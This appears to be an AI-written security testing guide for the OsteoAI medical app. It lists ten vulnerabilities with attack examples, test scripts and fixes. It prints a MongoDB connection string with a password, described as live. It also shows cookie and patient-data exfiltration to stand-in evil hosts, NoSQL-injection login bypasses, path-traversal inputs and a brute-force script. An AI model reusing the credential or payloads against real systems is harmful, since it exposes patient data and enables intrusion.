# 🛡️ OsteoAI Security Testing Guide

> A hands-on guide to test your app against real hacker attacks, based on your actual codebase.

---

## Quick Summary of Vulnerabilities Found

| # | Vulnerability | Severity | File(s) |
|---|---|---|---|
| 1 | **Exposed API Keys in `.env`** | 🔴 CRITICAL | [.env](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/.env) |
| 2 | **No Authentication on API Endpoints** | 🔴 CRITICAL | [api.py](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/api.py) |
| 3 | **Wildcard CORS (`Access-Control-Allow-Origin: *`)** | 🟠 HIGH | [api.py](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/api.py#L206-L211) |
| 4 | **Admin Dashboard — Zero Auth** | 🔴 CRITICAL | [admin_api.py](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/admin_dashboard/admin_api.py) |
| 5 | **NoSQL Injection Risk** | 🟠 HIGH | [auth.py](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/auth.py#L46-L49) |
| 6 | **XSS via innerHTML** | 🟠 HIGH | [script.js](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/landing_page/script.js) |
| 7 | **Unrestricted File Upload** | 🟠 HIGH | [api.py](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/api.py#L422-L474) |
| 8 | **Path Traversal** | 🟡 MEDIUM | [api.py](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/api.py#L157-L159) |
| 9 | **Client-Side Auth Only (localStorage)** | 🟠 HIGH | [script.js](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/landing_page/script.js#L1-L7) |
| 10 | **Rate Limiting Missing** | 🟡 MEDIUM | All endpoints |

---

## How to Test Each Vulnerability

### 1. 🔴 Exposed API Keys — Credential Leak

> [!CAUTION]
> Your `.env` file contains **live credentials** (Gemini API key + MongoDB Atlas URI with username/password). If this repo is public on GitHub, **anyone can access your database and AI credits**.

**How a hacker exploits this:**
```bash
# A hacker finds your GitHub repo and reads .env
# They now have your MongoDB URI and can:
mongosh "mongodb+srv://Ishita:Ishita%4022053018@cluster0.1fj4mhs.mongodb.net/osteoai"

# They can dump all users, delete data, or steal patient info
```

**Test it yourself:**
```bash
# Check if .env is tracked in git
git log --all --full-history -- ".env"

# Check if .gitignore blocks it
type .gitignore | findstr ".env"
```

**Fix:**
1. Add `.env` to `.gitignore` immediately
2. Rotate your MongoDB password and Gemini API key NOW
3. Use environment variables on your deployment server instead of committing secrets

---

### 2. 🔴 No Authentication on API Endpoints

Your `/predict`, `/analyze-xray`, `/api/user/history`, and `/api/doctor/*` routes have **zero token/session verification**. Anyone can call them.

**How a hacker exploits this:**
```bash
# Anyone can get prediction results without logging in
curl -X POST http://localhost:8000/predict ^
  -H "Content-Type: application/json" ^
  -d "{\"age\": 65, \"gender\": \"Female\"}"

# Anyone can read ANY user's medical history by guessing emails
curl -X POST http://localhost:8000/api/user/history ^
  -H "Content-Type: application/json" ^
  -d "{\"user_email\": \"victim@gmail.com\"}"

# Anyone can view ALL doctor appointments
curl http://localhost:8000/api/doctor/appointments

# Anyone can read patient reports data
curl http://localhost:8000/api/doctor/reports
```

**Test it yourself** — Open a new browser tab (not logged in) and paste:
```
http://localhost:8000/api/doctor/appointments
http://localhost:8000/api/doctor/reports
```

If you see data, you're vulnerable.

**Fix:** Add JWT-based authentication:
```python
# Install: pip install PyJWT
import jwt, datetime, functools

SECRET_KEY = os.getenv("JWT_SECRET", "change-me-in-production!")

def generate_token(user_email):
    payload = {
        "email": user_email,
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24)
    }
    return jwt.encode(payload, SECRET_KEY, algorithm="HS256")

def require_auth(f):
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        token = request.headers.get("Authorization", "").replace("Bearer ", "")
        if not token:
            return jsonify({"status": "error", "message": "Missing token"}), 401
        try:
            data = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
            request.user_email = data["email"]
        except jwt.ExpiredSignatureError:
            return jsonify({"status": "error", "message": "Token expired"}), 401
        except jwt.InvalidTokenError:
            return jsonify({"status": "error", "message": "Invalid token"}), 401
        return f(*args, **kwargs)
    return decorated

# Usage:
@app.route('/predict', methods=['POST'])
@require_auth
def predict():
    ...
```

---

### 3. 🟠 Wildcard CORS — Cross-Site Data Theft

In [api.py line 208](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/api.py#L208):
```python
response.headers['Access-Control-Allow-Origin'] = '*'  # ← DANGEROUS
```

**How a hacker exploits this:**
A hacker creates a malicious website that calls YOUR API from the user's browser:
```html
<!-- evil-site.com/steal.html -->
<script>
  // This works because you allow ALL origins
  fetch('http://your-osteoai-server.com/api/doctor/appointments')
    .then(r => r.json())
    .then(data => {
      // Send stolen patient data to hacker's server
      fetch('https://evil-server.com/stolen', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
</script>
```

**Fix:**
```python
# Only allow your own domains
ALLOWED_ORIGINS = ['http://localhost:8000', 'http://localhost:8002', 'https://your-deployed-domain.com']

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get('Origin', '')
    if origin in ALLOWED_ORIGINS:
        response.headers['Access-Control-Allow-Origin'] = origin
    response.headers['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
    response.headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
    return response
```

---

### 4. 🔴 Admin Dashboard — Completely Unprotected

Your [admin_api.py](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/admin_dashboard/admin_api.py) has **no login, no auth, no password**. Anyone who finds port 8002 can:

**How a hacker exploits this:**
```bash
# Read all users
curl http://localhost:8002/api/users

# Disable ALL features on the patient-facing app remotely
curl -X POST http://localhost:8002/api/system/config ^
  -H "Content-Type: application/json" ^
  -d "{\"clinical_analysis\": false, \"xray_analysis\": false, \"appointments\": false}"

# Read all prediction logs
curl http://localhost:8002/api/predictions/logs

# Get server health info (reconnaissance)
curl http://localhost:8002/api/system/health
```

**Test it yourself:** Open `http://localhost:8002/api/users` in your browser. If you see user data, it's wide open.

**Fix:** Add admin auth middleware or basic API key protection:
```python
ADMIN_API_KEY = os.getenv("ADMIN_API_KEY", "super-secret-admin-key")

def require_admin(f):
    @functools.wraps(f)
    def decorated(*args, **kwargs):
        key = request.headers.get("X-Admin-Key")
        if key != ADMIN_API_KEY:
            return jsonify({"error": "Unauthorized"}), 403
        return f(*args, **kwargs)
    return decorated
```

---

### 5. 🟠 NoSQL Injection — Database Manipulation

In [auth.py line 46](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/auth.py#L46):
```python
user = self.collection.find_one({"email": email})  # email comes from user input!
```

**How a hacker exploits this:**
```bash
# NoSQL injection — bypass login without knowing the password
curl -X POST http://localhost:8000/login ^
  -H "Content-Type: application/json" ^
  -d "{\"email\": {\"$gt\": \"\"}, \"password\": {\"$gt\": \"\"}}"
```

This query translates to `find_one({"email": {"$gt": ""}})` which matches the **first user in the database** — the hacker logs in without a password!

**Test it yourself:**
```python
# test_nosql_injection.py
import requests

# Try NoSQL injection on login
r = requests.post("http://localhost:8000/login", json={
    "email": {"$gt": ""},
    "password": {"$gt": ""}
})
print(r.json())
# If you get "Login successful" — you're vulnerable!

# Try on history endpoint
r = requests.post("http://localhost:8000/api/user/history", json={
    "user_email": {"$ne": ""}  # Returns ALL users' history
})
print(r.json())
```

**Fix:** Sanitize all inputs:
```python
def sanitize_input(value):
    """Reject NoSQL injection operators"""
    if isinstance(value, dict):
        raise ValueError("Invalid input format")
    return str(value).strip()

def login(self, email, password):
    email = sanitize_input(email)    # ← Add this
    password = sanitize_input(password)  # ← Add this
    ...
```

---

### 6. 🟠 XSS — Executing Code in User's Browser

In [script.js](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/landing_page/script.js), multiple uses of `innerHTML` with unsanitized data:

```javascript
// Line 110 — medicine insight from API injected directly:
medInsightBox.innerHTML = `<p>${result.medicine_impact.insight}</p>`;

// Line 636 — user history rendered via innerHTML
historyContainer.innerHTML += cardHtml;  // record.prediction could contain malicious HTML
```

**How a hacker exploits this:**
If a hacker can manipulate the data stored in MongoDB (via NoSQL injection or compromised API), they can inject:
```json
{
    "prediction": "<img src=x onerror='fetch(\"https://evil.com/steal?cookie=\"+document.cookie)'>",
    "score": 99
}
```

When any user views their history, the malicious script runs and steals their data.

**Fix:** Always escape HTML:
```javascript
function escapeHtml(str) {
    const div = document.createElement('div');
    div.textContent = str;
    return div.innerHTML;
}

// Use it everywhere:
xrayPrediction.textContent = result.prediction;  // textContent is safe
// or
medInsightBox.innerHTML = `<p>${escapeHtml(result.medicine_impact.insight)}</p>`;
```

---

### 7. 🟠 Unrestricted File Upload — Remote Code Execution

In [api.py line 437-438](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/api.py#L437-L438):
```python
file_path = os.path.join(uploads_dir, file.filename)  # No validation!
file.save(file_path)
```

**How a hacker exploits this:**
```bash
# Upload a malicious file with crafted filename
curl -X POST http://localhost:8000/analyze-xray ^
  -F "file=@malware.exe;filename=../../../evil.py"

# Or upload an extremely large file (Denial of Service)
# Create a 1GB file and upload it to crash the server
```

**Test it yourself:**
```python
import requests
# Test path traversal in filename
files = {'file': ('../../../test.txt', b'hacked!', 'image/png')}
r = requests.post('http://localhost:8000/analyze-xray', files=files)
print(r.status_code, r.text)
```

**Fix:**
```python
from werkzeug.utils import secure_filename

ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'bmp', 'dcm'}
MAX_FILE_SIZE = 10 * 1024 * 1024  # 10 MB

@app.route('/analyze-xray', methods=['POST'])
def analyze_xray():
    file = request.files['file']
    
    # 1. Validate filename
    filename = secure_filename(file.filename)
    if not filename:
        return jsonify({"error": "Invalid filename"}), 400
    
    # 2. Validate extension
    ext = filename.rsplit('.', 1)[-1].lower()
    if ext not in ALLOWED_EXTENSIONS:
        return jsonify({"error": "File type not allowed"}), 400
    
    # 3. Validate size
    file.seek(0, 2)  # Seek to end
    size = file.tell()
    file.seek(0)     # Reset
    if size > MAX_FILE_SIZE:
        return jsonify({"error": "File too large"}), 400
    
    # 4. Use secure path
    file_path = os.path.join(uploads_dir, filename)
    file.save(file_path)
    ...
```

---

### 8. 🟡 Path Traversal — Reading Server Files

In [api.py line 157-159](file:///c:/Users/Aditya%20Gupta/OneDrive/Desktop/OSTEO%20AI/ml%20project/api.py#L157-L159):
```python
@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory(app.static_folder, path)
```

`send_from_directory` is mostly safe, but Flask's implementation should be tested.

**Test it yourself:**
```bash
# Try to read files outside the static folder
curl http://localhost:8000/../.env
curl http://localhost:8000/..%2F..%2F.env
curl http://localhost:8000/%2e%2e%2f.env
```

---

### 9. 🟠 Client-Side Auth Only — Trivially Bypassable

Your entire authentication check is in JavaScript:
```javascript
// script.js line 17-20
const username = localStorage.getItem('username');
if (!username) {
    window.location.href = '/';  // Redirect to login
}
```

**How a hacker exploits this:**
```javascript
// Open browser console (F12) on the login page and type:
localStorage.setItem('username', 'Admin');
localStorage.setItem('email', 'admin@osteoai.com');
window.location.href = '/index.html';
// Now they're "logged in" — and can make API calls with any email
```

**Fix:** Every API call must verify a server-issued token (see Fix #2 above). Client-side checks are only for UX, never for security.

---

### 10. 🟡 Rate Limiting Missing — Brute Force & DoS

**How a hacker exploits this:**
```python
# Brute force password attack
import requests

emails = ["admin@osteoai.com", "doctor@gmail.com"]
passwords = open("common_passwords.txt").readlines()

for email in emails:
    for pwd in passwords:
        r = requests.post("http://localhost:8000/login", json={
            "email": email,
            "password": pwd.strip()
        })
        if "success" in r.text:
            print(f"CRACKED: {email} / {pwd}")
            break
```

**Fix:**
```bash
pip install Flask-Limiter
```
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

limiter = Limiter(app=app, key_func=get_remote_address,
                  default_limits=["200 per hour"])

@app.route('/login', methods=['POST'])
@limiter.limit("5 per minute")  # Max 5 login attempts per minute
def login():
    ...

@app.route('/analyze-xray', methods=['POST'])
@limiter.limit("10 per minute")  # Prevent upload flooding
def analyze_xray():
    ...
```

---

## 🧪 Automated Security Testing Script

I recommend creating this test script to check all vulnerabilities at once:

```python
"""
OsteoAI Security Test Suite
Run: python security_test.py
"""
import requests

BASE = "http://localhost:8000"
ADMIN = "http://localhost:8002"
PASS = 0
FAIL = 0

def test(name, condition, detail=""):
    global PASS, FAIL
    if condition:
        print(f"  ❌ VULNERABLE: {name}")
        if detail: print(f"     └─ {detail}")
        FAIL += 1
    else:
        print(f"  ✅ SECURE: {name}")
        PASS += 1

print("\n🛡️ OsteoAI Security Scan\n" + "="*50)

# 1. Unauthenticated API access
print("\n[1] Authentication Checks")
r = requests.get(f"{BASE}/api/doctor/appointments")
test("Doctor appointments (no auth)", r.status_code == 200, r.text[:100])

r = requests.get(f"{BASE}/api/doctor/reports")
test("Doctor reports (no auth)", r.status_code == 200)

r = requests.post(f"{BASE}/api/user/history", json={"user_email": "test@test.com"})
test("User history (no auth)", r.status_code != 401)

# 2. NoSQL Injection
print("\n[2] NoSQL Injection")
r = requests.post(f"{BASE}/login", json={"email": {"$gt": ""}, "password": {"$gt": ""}})
test("Login bypass via $gt operator", "success" in r.text.lower(), r.text[:100])

r = requests.post(f"{BASE}/api/user/history", json={"user_email": {"$ne": ""}})
test("History dump via $ne operator", r.status_code == 200 and "data" in r.text)

# 3. CORS
print("\n[3] CORS Policy")
r = requests.get(f"{BASE}/api/doctor/appointments", headers={"Origin": "https://evil-hacker.com"})
cors = r.headers.get("Access-Control-Allow-Origin", "")
test("Wildcard CORS", cors == "*", f"ACAO header: {cors}")

# 4. Admin dashboard
print("\n[4] Admin Dashboard")
try:
    r = requests.get(f"{ADMIN}/api/users", timeout=3)
    test("Admin /api/users (no auth)", r.status_code == 200)
except:
    print("  ⏭️ SKIP: Admin dashboard not running on :8002")

try:
    r = requests.post(f"{ADMIN}/api/system/config", json={"clinical_analysis": False}, timeout=3)
    test("Admin can disable features (no auth)", r.status_code == 200)
except:
    print("  ⏭️ SKIP: Admin dashboard not running on :8002")

# 5. File upload
print("\n[5] File Upload")
files = {'file': ('test.exe', b'MZ\x90\x00', 'application/x-executable')}
r = requests.post(f"{BASE}/analyze-xray", files=files)
test("Accepts .exe upload", r.status_code != 400)

files = {'file': ('../../../hack.txt', b'pwned', 'image/png')}
r = requests.post(f"{BASE}/analyze-xray", files=files)
test("Path traversal in filename", r.status_code != 400)

# 6. Rate limiting
print("\n[6] Rate Limiting")
count = 0
for _ in range(20):
    r = requests.post(f"{BASE}/login", json={"email": "x@x.com", "password": "wrong"})
    if r.status_code != 429:
        count += 1
test("No rate limiting on login", count >= 20, f"Sent 20 requests, {count} accepted")

# Summary
print(f"\n{'='*50}")
print(f"Results: {PASS} secure | {FAIL} vulnerable")
print(f"{'='*50}\n")
```

---

## 🏥 Priority Fix Order

1. **TODAY**: Rotate your MongoDB password and Gemini API key, add `.env` to `.gitignore`
2. **This week**: Add JWT auth to all API endpoints + admin dashboard
3. **This week**: Add input sanitization for NoSQL injection  
4. **This week**: Validate file uploads (extension, size, secure filename)
5. **Next sprint**: Add rate limiting, fix CORS, escape HTML output

> [!IMPORTANT]
> If your code is on a **public GitHub repo**, your MongoDB credentials are already exposed. **Change your passwords immediately** before doing anything else. A hacker could delete your entire database right now.
